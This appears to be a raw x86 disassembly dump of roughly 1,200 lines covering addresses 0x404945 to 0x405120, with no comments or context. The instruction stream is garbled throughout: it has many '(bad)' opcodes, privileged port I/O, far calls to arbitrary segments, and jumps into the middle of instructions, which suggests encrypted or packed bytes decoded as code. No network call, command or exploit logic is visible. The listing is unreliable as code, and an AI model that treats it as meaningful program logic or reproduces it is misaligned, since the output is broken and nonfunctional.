  404945:	or     edx,DWORD PTR [ebp-0x677e815]
  40494b:	adc    DWORD PTR [ebx],ebp
  40494d:	mov    edi,0x21d6b631
  404952:	shl    DWORD PTR [edx-0x15679025],1
  404958:	fidiv  DWORD PTR [ebx]
  40495a:	xchg   BYTE PTR [ebx],ah
  40495c:	inc    edi
  40495d:	lock add eax,0x665a53b
  404963:	pushf  
  404964:	sub    al,0x5e
  404966:	mov    ds:0xd6254ad9,eax
  40496b:	mov    ecx,0x993b2d4
  404970:	int    0x48
  404972:	or     ecx,ebp
  404974:	jl     0x4049ba
  404976:	xor    BYTE PTR [edi+eiz*2+0x4e],ch
  40497a:	out    0x4e,al
  40497c:	aaa    
  40497d:	push   0xfd071c90
  404982:	or     BYTE PTR [edi+0x37],cl
  404985:	sbb    bl,BYTE PTR [edx+0x4d1a3939]
  40498b:	test   BYTE PTR [ebx+ecx*8+0xe],al
  40498f:	loopne 0x40499c
  404991:	add    ebp,DWORD PTR gs:[edx-0x4d]
  404995:	stos   DWORD PTR es:[edi],eax
  404996:	shr    BYTE PTR [edx],1
  404998:	mov    edx,0x7a411363
  40499d:	and    esp,DWORD PTR [edi+ecx*4-0x22]
  4049a1:	jg     0x404966
  4049a3:	push   edx
  4049a4:	bnd jle 0x4049ae
  4049a7:	xchg   esp,eax
  4049a8:	xchg   edx,eax
  4049a9:	inc    eax
  4049aa:	out    0x8a,al
  4049ac:	in     al,0xb0
  4049ae:	in     eax,dx
  4049af:	mov    ah,0x7c
  4049b1:	push   ss
  4049b2:	mov    ebp,edi
  4049b4:	dec    esp
  4049b5:	mov    esp,ds
  4049b7:	mov    ds:0xf1d8c494,eax
  4049bc:	outs   dx,DWORD PTR ds:[esi]
  4049bd:	sbb    DWORD PTR [esi-0x9cbf8b9],0x2e
  4049c4:	add    ebx,DWORD PTR [edi-0x9d979ee]
  4049ca:	mov    ebp,esi
  4049cc:	sti    
  4049cd:	rcl    DWORD PTR [edi-0x73],0x5e
  4049d1:	sti    
  4049d2:	mov    dh,0xcc
  4049d4:	and    ecx,DWORD PTR [esi-0x57537480]
  4049da:	pop    edi
  4049db:	daa    
  4049dc:	lock jbe 0x404a56
  4049df:	call   0xe112:0xdb2128b2
  4049e6:	in     al,dx
  4049e7:	hlt    
  4049e8:	data16 ffreep st(3)
  4049eb:	js     0x404a6b
  4049ed:	cmp    BYTE PTR [eax-0x6d12ea48],bl
  4049f3:	lds    edi,FWORD PTR [ebx-0x17]
  4049f6:	ds (bad) 
  4049f8:	cmp    BYTE PTR [edx+0x65],bh
  4049fb:	xor    BYTE PTR [edx+0x37b09aa0],bh
  404a01:	imul   edi,DWORD PTR [ebp-0x6ce24345],0xf6443019
  404a0b:	xor    dl,BYTE PTR [esi-0x37]
  404a0e:	xor    al,0x65
  404a10:	pusha  
  404a11:	jmp    0x41d98e2e
  404a16:	mov    edx,0xe28cf922
  404a1b:	clc    
  404a1c:	out    dx,al
  404a1d:	jb     0x404a75
  404a1f:	jnp    0x4049b8
  404a21:	and    eax,0x970d62f6
  404a26:	clc    
  404a27:	mov    ds:0xa70bfd9a,al
  404a2c:	push   esp
  404a2d:	sbb    DWORD PTR [eax],ecx
  404a2f:	mov    cs,WORD PTR ds:0x6e5bc92e
  404a35:	loope  0x404a75
  404a37:	mov    edx,DWORD PTR [ebp+0x3d1f2688]
  404a3d:	in     eax,dx
  404a3e:	and    edx,esi
  404a40:	mov    dh,0xe4
  404a42:	(bad)  
  404a43:	out    0xe3,eax
  404a45:	pop    eax
  404a46:	adc    edi,ecx
  404a48:	adc    cl,dh
  404a4a:	adc    DWORD PTR [edi-0x7c],0x51
  404a4e:	nop
  404a4f:	fnstsw WORD PTR ds:0xa8efa585
  404a55:	outs   dx,DWORD PTR ds:[esi]
  404a56:	fild   WORD PTR [edi+esi*4+0x33]
  404a5a:	mov    ch,0xe8
  404a5c:	cli    
  404a5d:	push   edx
  404a5e:	inc    edx
  404a5f:	shl    DWORD PTR [ebp+0x1efd46a4],cl
  404a65:	push   ss
  404a66:	dec    eax
  404a67:	lea    eax,[esi]
  404a69:	sbb    eax,0x6a05eb9b
  404a6e:	call   0x49bf50bd
  404a73:	xor    cl,ch
  404a75:	into   
  404a76:	imul   edx,DWORD PTR [ecx+0x4cbcf38b],0x9cc628c8
  404a80:	(bad)  
  404a81:	into   
  404a82:	dec    esp
  404a83:	out    0x45,eax
  404a85:	and    BYTE PTR [edi-0x2b28b3ad],bl
  404a8b:	add    dl,dl
  404a8d:	dec    edi
  404a8e:	xchg   bh,ah
  404a90:	jg     0x404aaf
  404a92:	dec    esi
  404a93:	inc    esp
  404a94:	adc    al,0xd1
  404a96:	mov    edi,0x49c966d5
  404a9b:	aad    0x42
  404a9d:	jl     0x404a80
  404a9f:	outs   dx,DWORD PTR ds:[esi]
  404aa0:	les    esp,FWORD PTR [ebx]
  404aa2:	dec    esi
  404aa3:	fcmove st,st(1)
  404aa5:	pop    es
  404aa6:	in     al,dx
  404aa7:	stos   DWORD PTR es:[edi],eax
  404aa8:	pusha  
  404aa9:	arpl   WORD PTR [eax-0x55],cx
  404aac:	imul   eax,DWORD PTR ds:0x1845901e,0x4f
  404ab3:	hlt    
  404ab4:	fwait
  404ab5:	(bad)  
  404ab6:	jo     0x404b24
  404ab8:	sub    DWORD PTR [ebx-0x37],esp
  404abb:	stos   BYTE PTR es:[edi],al
  404abc:	icebp  
  404abd:	jnp    0x404b07
  404abf:	stos   BYTE PTR es:[edi],al
  404ac0:	mov    BYTE PTR [ecx-0x75fec386],ch
  404ac6:	icebp  
  404ac7:	cwde   
  404ac8:	add    edi,DWORD PTR [ebp+ebx*2-0x54b7784b]
  404acf:	fcom   QWORD PTR [ebp+ebp*8-0x21ebecbd]
  404ad6:	jmp    0x85b2:0x810516aa
  404add:	inc    ecx
  404ade:	pop    edi
  404adf:	sahf   
  404ae0:	cmc    
  404ae1:	xchg   ch,cl
  404ae3:	jnp    0x404b09
  404ae5:	loope  0x404aa8
  404ae7:	js     0x404ab3
  404ae9:	sub    DWORD PTR [edi-0x1c],esi
  404aec:	call   0x80f3:0x35cf1d37
  404af3:	mov    ds:0x37240e33,al
  404af8:	sbb    cl,al
  404afa:	hlt    
  404afb:	inc    ecx
  404afc:	test   eax,0xdc27300a
  404b01:	fistp  WORD PTR [esi]
  404b03:	movsx  edx,BYTE PTR [ebx+0x1b9802e1]
  404b0a:	mov    bh,0x53
  404b0c:	jno    0x404b23
  404b0e:	fwait
  404b0f:	push   esp
  404b10:	pcmpeqd mm4,QWORD PTR [edi+edx*8-0x11]
  404b15:	cdq    
  404b16:	mov    dl,0x99
  404b18:	xchg   ebp,eax
  404b19:	lahf   
  404b1a:	and    esp,ebx
  404b1c:	out    dx,al
  404b1d:	ins    DWORD PTR es:[edi],dx
  404b1e:	int    0x27
  404b20:	int3   
  404b21:	(bad)  
  404b23:	(bad)  
  404b24:	fucomp st(3)
  404b26:	mov    dl,0x8c
  404b28:	mov    edi,0x394c8ecf
  404b2d:	dec    edi
  404b2e:	ins    DWORD PTR es:[edi],dx
  404b2f:	cli    
  404b30:	(bad)  
  404b31:	adc    edi,esp
  404b33:	test   BYTE PTR [ebp-0x199e50e9],0x38
  404b3a:	(bad)  
  404b3b:	out    dx,eax
  404b3c:	loopne 0x404b12
  404b3e:	arpl   dx,bx
  404b40:	xor    DWORD PTR [eax+0x7bbf37cd],0xffffffc2
  404b47:	jge    0x404b28
  404b49:	icebp  
  404b4a:	scas   al,BYTE PTR es:[edi]
  404b4b:	jge    0x404ada
  404b4d:	into   
  404b4e:	adc    BYTE PTR [eax-0x47513748],bl
  404b54:	fisubr WORD PTR [edi+0x32]
  404b57:	imul   ecx,DWORD PTR [ecx-0x1cf011e1],0x85ed34fa
  404b61:	jg     0x404b5e
  404b63:	arpl   WORD PTR ds:0xcad95c8c,si
  404b69:	jmp    0x88c0:0x8fa2dc68
  404b70:	cwde   
  404b71:	jnp    0x404b50
  404b73:	or     dh,dh
  404b75:	sbb    eax,0xa987d8a1
  404b7a:	pop    edi
  404b7b:	stos   DWORD PTR es:[edi],eax
  404b7c:	add    cl,BYTE PTR [esi*1+0x36357acc]
  404b83:	mov    eax,0xd639fe6f
  404b88:	push   esi
  404b89:	in     al,dx
  404b8a:	xchg   edx,eax
  404b8b:	mov    cl,0x79
  404b8d:	jge    0x404bae
  404b8f:	inc    ebp
  404b90:	adc    DWORD PTR [ecx-0x2154e186],0xfa85339e
  404b9a:	test   al,0xeb
  404b9c:	or     al,BYTE PTR gs:[eax]
  404b9f:	or     DWORD PTR [edi-0x14],eax
  404ba2:	sbb    BYTE PTR [ebx+0xd109ec6],ch
  404ba8:	shl    ebp,1
  404baa:	and    ah,cl
  404bac:	repnz leave 
  404bae:	push   esi
  404baf:	mov    dh,0xf3
  404bb1:	jecxz  0x404b3a
  404bb3:	sbb    BYTE PTR [edi+0x8],ah
  404bb6:	adc    eax,0x25db6d10
  404bbb:	ret    
  404bbc:	xor    ch,BYTE PTR [esi+edi*4+0x67]
  404bc0:	rcl    edx,0xa4
  404bc3:	int    0x4e
  404bc5:	out    dx,eax
  404bc6:	into   
  404bc7:	dec    ecx
  404bc8:	and    eax,0x2785110b
  404bcd:	xchg   edi,eax
  404bce:	fcomp  DWORD PTR ds:0xf13aa790
  404bd4:	ds dec ecx
  404bd6:	shr    DWORD PTR [esi+0x7a],0x45
  404bda:	jmp    0xc8b57965
  404bdf:	or     BYTE PTR [eax+0x66d1f1fb],cl
  404be5:	cwde   
  404be6:	and    eax,0xe8f7afde
  404beb:	into   
  404bec:	mov    bh,0x92
  404bee:	cld    
  404bef:	jnp    0x404bd8
  404bf1:	sbb    esi,DWORD PTR [eax+0x343bbf12]
  404bf7:	xchg   BYTE PTR [esi+eiz*8],cl
  404bfa:	inc    ebx
  404bfb:	imul   esi
  404bfd:	jg     0x404c6e
  404bff:	jl     0x404bd3
  404c01:	imul   ecx,DWORD PTR [ecx],0xffffffe7
  404c04:	repnz xor DWORD PTR [ecx+0x4b9c5117],edx
  404c0b:	scas   eax,DWORD PTR es:[edi]
  404c0c:	and    eax,0x5f4e8fc7
  404c11:	push   cs
  404c12:	jecxz  0x404bf8
  404c14:	int    0x10
  404c16:	push   0x65
  404c18:	add    al,0x99
  404c1a:	xlat   BYTE PTR ds:[ebx]
  404c1b:	jmp    0x77ce1ac1
  404c20:	sub    edx,esp
  404c22:	imul   edx,DWORD PTR [edx+0x4d],0xbba7c118
  404c29:	or     DWORD PTR [eax],edi
  404c2b:	push   eax
  404c2c:	test   BYTE PTR [ebp-0x27c617b],cl
  404c32:	xor    ebx,DWORD PTR [ecx+ebx*2]
  404c35:	fld    TBYTE PTR [edx]
  404c37:	aas    
  404c38:	adc    edx,edi
  404c3a:	or     edi,DWORD PTR [esi+edi*1]
  404c3d:	out    0xe9,al
  404c3f:	sbb    ah,dl
  404c41:	sbb    esi,0x52557b92
  404c47:	xor    ebx,edx
  404c49:	imul   esp,edi,0x92c308e6
  404c4f:	xchg   edi,eax
  404c50:	sub    eax,DWORD PTR [edi]
  404c52:	xor    eax,0x833b383a
  404c57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c58:	outs   dx,BYTE PTR ds:[esi]
  404c59:	cmc    
  404c5a:	out    0x5e,al
  404c5c:	xlat   BYTE PTR ds:[ebx]
  404c5d:	jno    0x404c5e
  404c5f:	xlat   BYTE PTR ds:[ebx]
  404c60:	xchg   esp,eax
  404c61:	xor    eax,0xdc07ecf0
  404c66:	inc    ebp
  404c67:	mov    ebp,0x54035ed2
  404c6c:	test   eax,0xe1b6051d
  404c71:	fdivrp st(0),st
  404c73:	jg     0x404c3c
  404c75:	jl     0x404c4a
  404c77:	hlt    
  404c78:	mov    WORD PTR [edx+0x14],gs
  404c7b:	test   eax,0xb150429d
  404c80:	push   edx
  404c81:	mov    bl,0x19
  404c83:	pushf  
  404c84:	ins    DWORD PTR es:[edi],dx
  404c85:	pop    ecx
  404c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c87:	mov    edi,0x5a040c65
  404c8c:	cli    
  404c8d:	adc    eax,0x7de79e75
  404c92:	inc    esp
  404c93:	(bad)  
  404c94:	adc    bl,dh
  404c96:	out    0x7c,al
  404c98:	jno    0x404cd1
  404c9a:	(bad)
  404c9d:	out    dx,eax
  404c9e:	cwde   
  404c9f:	cwde   
  404ca0:	jge    0x404c60
  404ca2:	daa    
  404ca3:	push   esi
  404ca4:	sbb    BYTE PTR [esi],bh
  404ca6:	jg     0x404d1c
  404ca8:	dec    esi
  404ca9:	(bad)  
  404caa:	dec    ebx
  404cab:	or     eax,0x7cf966a3
  404cb0:	jge    0x404ceb
  404cb2:	push   cs
  404cb3:	jns    0x404d32
  404cb5:	jmp    0xb422:0x5afaedba
  404cbc:	and    al,0xb3
  404cbe:	jecxz  0x404d07
  404cc0:	(bad)  
  404cc1:	rcl    DWORD PTR [ebx+0x30],1
  404cc4:	sbb    al,0x16
  404cc6:	fdiv   DWORD PTR gs:[ecx+0x60]
  404cca:	adc    ah,BYTE PTR [ecx+0x75]
  404ccd:	mov    ds:0x9eefde68,al
  404cd2:	or     bl,bh
  404cd4:	rol    DWORD PTR [edx],1
  404cd6:	sub    BYTE PTR [ebx],dh
  404cd8:	mov    WORD PTR [edi-0x781c48bf],es
  404cde:	cmp    ebp,DWORD PTR [ecx-0x581a7458]
  404ce4:	add    dh,BYTE PTR [edx]
  404ce6:	mov    ecx,0x7c6804f4
  404ceb:	test   BYTE PTR [esi-0x675b2e18],0xd
  404cf2:	or     al,BYTE PTR [edi]
  404cf4:	retf   0x8e9c
  404cf7:	mov    ebx,0xf4124056
  404cfc:	aaa    
  404cfd:	nop
  404cfe:	sbb    BYTE PTR [esi-0x78],bl
  404d01:	lds    ebx,FWORD PTR [ebx]
  404d03:	inc    ebp
  404d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d05:	or     bh,BYTE PTR [eax-0xc]
  404d08:	scas   eax,DWORD PTR es:[edi]
  404d09:	mov    ecx,0x2a091068
  404d0e:	mov    ch,0x1c
  404d10:	cwde   
  404d11:	arpl   WORD PTR [edi-0xd],bp
  404d14:	sbb    DWORD PTR [ebx+0x4317a12d],ebp
  404d1a:	pusha  
  404d1b:	sbb    BYTE PTR [edx],al
  404d1d:	mov    ebx,0x42423ec4
  404d22:	mov    bh,0x82
  404d24:	cmp    eax,0x4b6ba0
  404d29:	scas   eax,DWORD PTR es:[edi]
  404d2a:	adc    BYTE PTR [edi-0x30ebb079],ch
  404d30:	in     al,dx
  404d31:	inc    eax
  404d32:	sti    
  404d33:	jge    0x404d0e
  404d35:	nop
  404d36:	xchg   esp,eax
  404d37:	imul   edx,DWORD PTR [eax],0x63134b64
  404d3d:	or     eax,0xaadf8508
  404d42:	jmp    0x2a2f:0xaab02fd7
  404d49:	mov    ah,0x20
  404d4b:	add    BYTE PTR [edi-0x3d2f2f9c],0x5
  404d52:	sub    eax,0x7a552948
  404d57:	ret    0x4e06
  404d5a:	adc    DWORD PTR [edi-0x25],eax
  404d5d:	xchg   DWORD PTR [eax-0x77],edi
  404d60:	mov    bh,0xc7
  404d62:	push   ds
  404d63:	sbb    ecx,DWORD PTR ds:0x7e0ae91b
  404d69:	and    eax,DWORD PTR [bp+si+0x42]
  404d6d:	xor    DWORD PTR [edx],0x5364f14
  404d73:	or     ah,dh
  404d75:	dec    esp
  404d76:	adc    eax,DWORD PTR [eax+0x57bdcc3c]
  404d7c:	adc    DWORD PTR [edi],ecx
  404d7e:	cmc    
  404d7f:	retf   0x5f42
  404d82:	loope  0x404d42
  404d84:	sbb    eax,0x6cec3cf1
  404d89:	repz not DWORD PTR [ebx+esi*2+0x4aa47c3]
  404d91:	push   esp
  404d92:	lea    ebp,[ebp-0xc]
  404d95:	iret   
  404d96:	xor    al,0xb5
  404d98:	ins    BYTE PTR es:[edi],dx
  404d99:	arpl   si,dx
  404d9b:	adc    ebx,eax
  404d9d:	mov    WORD PTR [ebp+ebx*1-0x12760e39],ss
  404da4:	jmp    0x5e4c:0x1717d9e6
  404dab:	mov    ebx,0x6b83e1e3
  404db0:	int3   
  404db1:	shl    DWORD PTR [ebx+esi*8+0x4723ebb5],0xd6
  404db9:	stos   DWORD PTR es:[edi],eax
  404dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dbb:	outs   dx,BYTE PTR ds:[esi]
  404dbc:	xchg   edi,eax
  404dbd:	mov    ds:0xdd0e29a7,eax
  404dc2:	bound  esp,QWORD PTR [ebx]
  404dc4:	leave  
  404dc5:	cdq    
  404dc6:	ret    0x6f84
  404dc9:	fdivr  DWORD PTR [ebp+0x51]
  404dcc:	lock stc 
  404dce:	bound  edx,QWORD PTR [edi]
  404dd0:	cmp    BYTE PTR [eax],cl
  404dd2:	aam    0x6
  404dd4:	pop    ebx
  404dd5:	sbb    BYTE PTR ds:0x158ed10,0xb5
  404ddc:	lahf   
  404ddd:	fxch   st(1)
  404ddf:	cmp    DWORD PTR [esi+edx*2],esi
  404de2:	or     eax,0xf58a45ef
  404de7:	inc    edi
  404de8:	imul   esi,DWORD PTR [ecx+0x1a],0xfffffffd
  404dec:	or     BYTE PTR [ebx+0x4a],bl
  404def:	xchg   esp,eax
  404df0:	mov    cl,0xb8
  404df2:	shl    DWORD PTR [edi],0x5c
  404df5:	mov    ebp,0x6acc3d17
  404dfa:	in     al,0x60
  404dfc:	xor    DWORD PTR [eax-0x7bbc70fa],ecx
  404e02:	sbb    BYTE PTR [eax+edi*1+0x58],cl
  404e06:	fs adc al,0xe7
  404e09:	sti    
  404e0a:	fcmovu st,st(5)
  404e0c:	fs sbb cl,bl
  404e0f:	push   eax
  404e10:	lahf   
  404e11:	mov    bh,0xa1
  404e13:	push   0xb4874f25
  404e18:	push   ecx
  404e19:	outs   dx,DWORD PTR ds:[esi]
  404e1a:	mov    dl,0x78
  404e1c:	pushf  
  404e1d:	jp     0x404e94
  404e1f:	loopne 0x404e66
  404e21:	jne    0x404db1
  404e23:	out    dx,eax
  404e24:	jns    0x404dcd
  404e26:	fmul   st,st(5)
  404e28:	push   cs
  404e29:	xor    al,0x38
  404e2b:	mov    esp,0x2ddf8f5e
  404e30:	les    edi,FWORD PTR [ebp-0x6]
  404e33:	or     al,BYTE PTR [ecx]
  404e35:	mov    ds:0xa9e22464,al
  404e3a:	ficom  WORD PTR [ecx]
  404e3c:	pop    edi
  404e3d:	sbb    edx,DWORD PTR [ecx+edx*8]
  404e40:	out    0xe5,al
  404e42:	repz test DWORD PTR ds:0x7607cc9f,edi
  404e49:	enter  0xe735,0x66
  404e4d:	mov    ebp,0x209ccd9e
  404e52:	mov    edi,0xe970efdf
  404e57:	mov    cl,0x5a
  404e59:	loope  0x404e21
  404e5b:	xchg   DWORD PTR [ecx+0x64],esi
  404e5e:	push   ds
  404e5f:	not    BYTE PTR [ecx+0x40]
  404e62:	push   edi
  404e63:	aam    0xe4
  404e65:	adc    DWORD PTR [esp+eiz*2-0x86f8c94],0x4f72042f
  404e70:	push   ebp
  404e71:	xchg   esi,eax
  404e72:	sti    
  404e73:	bound  edx,QWORD PTR [edx-0x17c5c1f5]
  404e79:	and    bh,BYTE PTR [eax]
  404e7b:	mov    ebx,edi
  404e7d:	scas   ax,WORD PTR es:[edi]
  404e7f:	loope  0x404e13
  404e81:	xchg   ecx,eax
  404e82:	shl    BYTE PTR [edx-0x4],1
  404e85:	xor    eax,0xc430386f
  404e8a:	push   ds
  404e8b:	pop    ss
  404e8c:	icebp  
  404e8d:	inc    ebx
  404e8e:	xchg   ecx,eax
  404e8f:	cli    
  404e90:	jl     0x404eb2
  404e92:	or     al,0x5d
  404e94:	add    eax,0x3a7950e6
  404e99:	fs jns 0x404eb5
  404e9c:	dec    ebp
  404e9d:	dec    esi
  404e9e:	sbb    al,BYTE PTR [ecx-0x154c27b]
  404ea4:	out    0x6d,al
  404ea6:	jp     0x404e8b
  404ea8:	mov    ebp,0x6ccb4dc2
  404ead:	dec    BYTE PTR [eax+0x3c60f4b3]
  404eb3:	outs   dx,DWORD PTR ds:[esi]
  404eb4:	aaa    
  404eb5:	hlt    
  404eb6:	push   esp
  404eb7:	push   ebp
  404eb8:	dec    ecx
  404eb9:	jle    0x404e54
  404ebb:	aas    
  404ebc:	les    ecx,FWORD PTR [edi+0x22]
  404ebf:	xchg   edi,eax
  404ec0:	mov    edx,ebx
  404ec2:	les    esp,FWORD PTR [ebx]
  404ec4:	out    0x38,al
  404ec6:	packuswb mm2,mm4
  404ec9:	jl     0x404f3c
  404ecb:	lahf   
  404ecc:	cmc    
  404ecd:	cdq    
  404ece:	mov    BYTE PTR [esi],cl
  404ed0:	stc    
  404ed1:	inc    ebp
  404ed2:	cwde   
  404ed3:	test   BYTE PTR [ecx+edi*8],dh
  404ed6:	inc    esi
  404ed7:	cmp    al,0x70
  404ed9:	mov    esi,0xed4cc5ab
  404ede:	retf   
  404edf:	push   0xffffffd8
  404ee1:	sub    BYTE PTR [eax-0x7df00344],al
  404ee7:	mov    eax,ds:0x3a49e995
  404eec:	loopne 0x404f49
  404eee:	pop    es
  404eef:	sbb    dl,cl
  404ef1:	sahf   
  404ef2:	stos   DWORD PTR es:[edi],eax
  404ef3:	mov    fs,WORD PTR [edi-0x7e]
  404ef6:	xchg   esi,eax
  404ef7:	xchg   ebp,ecx
  404ef9:	outs   dx,BYTE PTR ds:[esi]
  404efa:	rcl    DWORD PTR [eax],0xab
  404efd:	cmp    al,0x2d
  404eff:	popa   
  404f00:	cmp    al,0x8c
  404f02:	pop    edx
  404f03:	dec    edx
  404f04:	push   0xffffffaf
  404f06:	enter  0x2e05,0xff
  404f0a:	push   eax
  404f0b:	or     eax,0x519ff169
  404f10:	call   0x564e:0xfa8d6ce5
  404f17:	lea    edx,[esi]
  404f19:	and    ah,BYTE PTR [edi-0x63996732]
  404f1f:	retf   0x7b8a
  404f22:	cmc    
  404f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f24:	stos   DWORD PTR es:[edi],eax
  404f25:	xchg   edx,eax
  404f26:	stos   DWORD PTR es:[edi],eax
  404f27:	add    ch,BYTE PTR [edx+ecx*4+0x2b5b4ca]
  404f2e:	mov    cl,0xfe
  404f30:	jp     0x404f4a
  404f32:	popa   
  404f33:	dec    eax
  404f34:	pop    ecx
  404f35:	fbstp  TBYTE PTR [ebx-0x15e7c51d]
  404f3b:	aam    0x79
  404f3d:	or     eax,0x3dcb858e
  404f42:	cmp    edi,DWORD PTR [eax]
  404f44:	loopne 0x404f0f
  404f46:	jp     0x404f7a
  404f48:	or     al,0x2d
  404f4a:	je     0x404f2f
  404f4c:	lds    edi,FWORD PTR [ebp-0x7ff08fab]
  404f52:	mov    ebx,0x660248d5
  404f57:	int    0xc8
  404f59:	into   
  404f5a:	int    0xbf
  404f5c:	push   edx
  404f5d:	jns    0x404f9c
  404f5f:	fcom   st(0)
  404f61:	sbb    edi,ebp
  404f63:	lahf   
  404f64:	in     al,dx
  404f65:	mov    esi,0x8c9f4c33
  404f6a:	pop    ss
  404f6b:	push   edx
  404f6c:	icebp  
  404f6d:	pop    es
  404f6e:	shl    BYTE PTR [esi+0x340ed972],0xc2
  404f75:	mov    al,ds:0xf5349c58
  404f7a:	and    al,0xe8
  404f7c:	xlat   BYTE PTR ds:[ebx]
  404f7d:	repz dec esi
  404f7f:	jb     0x404fda
  404f81:	lods   al,BYTE PTR ds:[esi]
  404f82:	cmp    ah,0x21
  404f85:	test   al,0xb0
  404f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f88:	loop   0x405005
  404f8a:	outs   dx,DWORD PTR ds:[esi]
  404f8b:	dec    ebp
  404f8c:	inc    ecx
  404f8d:	fst    DWORD PTR [eax]
  404f8f:	lods   eax,DWORD PTR ds:[esi]
  404f90:	cli    
  404f91:	pop    esi
  404f92:	or     bh,BYTE PTR [ebx-0xb47ac54]
  404f98:	or     esp,DWORD PTR [eax+0x3e14d2f5]
  404f9e:	mov    al,ds:0xa4cc324f
  404fa3:	or     BYTE PTR [ebx-0x538011ae],dl
  404fa9:	mov    esi,0xb8051ad3
  404fae:	je     0x404fbd
  404fb0:	or     eax,0xce3b0cb9
  404fb5:	xchg   DWORD PTR [edi+0x37220da4],edx
  404fbb:	outs   dx,BYTE PTR ds:[esi]
  404fbc:	or     edx,DWORD PTR [edx-0x59]
  404fbf:	in     al,0xa4
  404fc1:	(bad)
  404fc4:	or     ch,ah
  404fc6:	or     al,0xc5
  404fc8:	fisttp WORD PTR [ecx+ebx*1-0x459b7837]
  404fcf:	sbb    ch,al
  404fd1:	ficom  DWORD PTR [edi-0x2dc3685a]
  404fd7:	inc    DWORD PTR [edi+ecx*1-0x6215edfd]
  404fde:	pop    esi
  404fdf:	fild   DWORD PTR [ecx-0x2bf2ba06]
  404fe5:	push   esi
  404fe6:	call   0xa47e:0x456cf695
  404fed:	dec    ebx
  404fee:	inc    ecx
  404fef:	mov    ebp,0x416d86a7
  404ff4:	scas   eax,DWORD PTR es:[edi]
  404ff5:	imul   eax,DWORD PTR [ebp+eiz*1-0x655c0a5a],0x24
  404ffd:	mov    bl,0x8
  404fff:	jne    0x405022
  405001:	test   BYTE PTR fs:[ebp-0x17],dl
  405005:	and    edx,esi
  405007:	punpckhdq mm0,mm3
  40500a:	repnz push edi
  40500c:	aas    
  40500d:	pop    es
  40500e:	xor    ecx,0x19
  405011:	idiv   esp
  405013:	shl    ebx,1
  405015:	imul   BYTE PTR [edx+eiz*1-0x6a3a469c]
  40501c:	cli    
  40501d:	sbb    DWORD PTR [edx-0x618df89],eax
  405023:	inc    ebx
  405024:	xor    eax,0xb4f045bc
  405029:	and    ecx,DWORD PTR [esi]
  40502b:	int    0x31
  40502d:	pop    ds
  40502e:	cwde   
  40502f:	fidiv  DWORD PTR ds:[ebx+0x13]
  405033:	cmp    al,0x15
  405035:	push   eax
  405036:	shl    eax,1
  405038:	xchg   edi,eax
  405039:	das    
  40503a:	pop    ss
  40503b:	ja     0x404ff6
  40503d:	push   ecx
  40503e:	mov    bh,0xbd
  405040:	xlat   BYTE PTR ds:[ebx]
  405041:	add    eax,0x103ae0ab
  405046:	mov    esi,DWORD PTR [ebp+0x5a]
  405049:	dec    ebx
  40504a:	pop    edi
  40504b:	jne    0x405077
  40504d:	jb     0x405040
  40504f:	rcl    BYTE PTR [ecx+ebp*8+0x3b],1
  405053:	mov    edi,0x8715621d
  405058:	dec    ebx
  405059:	push   edi
  40505a:	popa   
  40505b:	ror    edx,cl
  40505d:	dec    edx
  40505e:	(bad)  
  40505f:	hlt    
  405060:	(bad)  
  405062:	cmc    
  405063:	mov    ds:0xfad4cc4d,al
  405068:	mov    cl,0x3c
  40506a:	jae    0x404ffe
  40506c:	xchg   BYTE PTR [esi],dl
  40506e:	iret   
  40506f:	pop    ecx
  405070:	xor    BYTE PTR [esi],ch
  405072:	pushf  
  405073:	jae    0x40506f
  405075:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405077:	fwait
  405078:	sbb    eax,0x1e51a4a
  40507d:	out    dx,al
  40507e:	and    DWORD PTR [ebx-0x47875f70],ebx
  405084:	scas   eax,DWORD PTR es:[edi]
  405085:	add    eax,0x449185e4
  40508a:	pop    ebx
  40508b:	hlt    
  40508c:	push   edi
  40508d:	inc    edi
  40508e:	fistp  WORD PTR [edi-0x6e6188e4]
  405094:	ja     0x4050b7
  405096:	xor    esi,DWORD PTR [eax-0x35]
  405099:	outs   dx,DWORD PTR ds:[esi]
  40509a:	adc    al,0xa
  40509c:	sahf   
  40509d:	pusha  
  40509e:	jle    0x40506b
  4050a0:	sbb    bl,BYTE PTR [ebx+0xf49fe3a]
  4050a6:	xchg   ebx,eax
  4050a7:	add    cl,bh
  4050a9:	dec    ebx
  4050aa:	mov    edi,0x5a21da9f
  4050af:	mul    edx
  4050b1:	enter  0x4bdf,0x84
  4050b5:	or     DWORD PTR [edi],edi
  4050b7:	rol    ah,0x88
  4050ba:	int3   
  4050bb:	push   ebx
  4050bc:	shl    DWORD PTR [esi+0x6fd244d],1
  4050c2:	iret   
  4050c3:	mov    DWORD PTR [ebp-0x12],esi
  4050c6:	imul   esi,DWORD PTR [ebx-0x25],0x37
  4050ca:	mov    ah,0x60
  4050cc:	addr16 cwde 
  4050ce:	jne    0x405101
  4050d0:	push   es
  4050d1:	jmp    0x40506e
  4050d3:	test   al,0xf2
  4050d5:	hlt    
  4050d6:	out    dx,al
  4050d7:	shr    BYTE PTR [ecx+0x468c2236],1
  4050dd:	retf   
  4050de:	test   DWORD PTR [ebx+0x7c454402],eax
  4050e4:	out    0xe9,al
  4050e6:	mov    cs,WORD PTR [ecx]
  4050e8:	sbb    bh,BYTE PTR [ebx+0x62]
  4050eb:	jmp    DWORD PTR [ecx]
  4050ed:	push   ecx
  4050ee:	stc    
  4050ef:	adc    eax,0x318a65b4
  4050f4:	out    0xe2,eax
  4050f6:	sbb    DWORD PTR [edx],eax
  4050f8:	fidiv  WORD PTR [ebp-0x61586ea0]
  4050fe:	sub    eax,ebx
  405100:	xlat   BYTE PTR ds:[ebx]
  405101:	int3   
  405102:	mov    cl,0x64
  405104:	push   es
  405105:	jae    0x405143
  405107:	dec    ecx
  405108:	ror    bl,0x35
  40510b:	inc    ecx
  40510c:	(bad)  
  40510d:	push   eax
  40510e:	hlt    
  40510f:	jecxz  0x405163
  405111:	mov    ah,0xe8
  405113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405115:	test   BYTE PTR [ebx-0x96fd860],ch
  40511b:	xchg   esp,eax
  40511c:	and    bh,bh
  40511e:	aas    
  40511f:	in     eax,dx
  405120:	pushf  
